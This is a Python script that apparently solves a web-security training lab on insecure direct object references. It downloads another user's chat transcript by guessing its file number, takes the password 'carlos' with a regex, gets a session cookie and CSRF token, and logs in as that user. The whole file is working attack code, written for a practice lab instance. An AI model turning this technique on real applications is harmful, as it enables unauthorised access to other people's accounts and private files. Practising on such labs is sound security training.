###############################################################
#
# Author: Ahmed Elqalawii
#
# Date: 5/9/2023
#
# Lab: Insecure direct object references
#
# Steps: 1. Fetch 1.txt log file
#        2. Extract carlos password from the log file
#        3. Login as carlos
#
################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore

# change this url to your lab
url = "https://0a05000e04213bdf82746f4400b80068.web-security-academy.net"

try:  # fetch 1.txt log file
    admin_profile = requests.get(
        f"{url}/download-transcript/1.txt")
    if admin_profile.status_code == 200:
        print(Fore.WHITE + "1. Fetching 1.txt log file.. " +
              Fore.GREEN + "OK")
        # extract the carlos password from source code
        carlos_pass = re.findall(r"password is (.*)\.",
                                 admin_profile.text)[0]
        print(Fore.WHITE + "2. Extracting password from the log file.. " +
              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + carlos_pass)
        try:  # fetch login page to get valid session and csrf token
            get_login = requests.get(
                f"{url}/login")
            if get_login.status_code == 200:
                print(
                    Fore.WHITE + "3. Fetching login page to get valid session and csrf token.. " + Fore.GREEN + "OK")
                # extract the session cookie
                session = get_login.cookies.get("session")
                # extract the csrf token
                csrf = re.findall("csrf.+value=\"(.+)\"",
                                  get_login.content.decode())[0]
                try:  # login as carlos
                    data = {
                        "username": "carlos",
                        "password": carlos_pass,
                        "csrf": csrf
                    }
                    cookies = {
                        "session": session
                    }
                    login = requests.post(
                        f"{url}/login", data, cookies=cookies, allow_redirects=False)
                    if login.status_code == 302:
                        print(
                            Fore.WHITE + "4. Logging in as carlos.. " + Fore.GREEN + "OK")
                        # extract the new session
                        new_session = login.cookies.get("session")
                        try:  # fetch carlos profile
                            cookies = {"session": new_session}
                            delete_carlos = requests.get(
                                f"{url}/my-account", cookies=cookies)
                            if delete_carlos.status_code == 200:
                                print(
                                    Fore.WHITE + "5. Fetching carlos profile.. " + Fore.GREEN + "OK")
                                print(
                                    Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
                            else:
                                print(
                                    Fore.RED + "[!] Failed to fetch carlos profile")
                        except:
                            print(
                                Fore.RED + "[!] Failed to fetch carlos profile through exception")
                    else:
                        print(
                            Fore.RED + "[!] Failed to login as carlos")
                except:
                    print(
                        Fore.RED + "[!] Failed to login as carlos through exception")
            else:
                print(
                    Fore.RED + "[!] Failed to fetch login page")
        except:
            print(
                Fore.RED + "[!] Failed to fetch login page through exception")
    else:
        print(Fore.RED + "[!] Failed to fetch 1.txt log file")
except:
    print(
        Fore.RED + "[!] Failed to fetch 1.txt log file through exception")
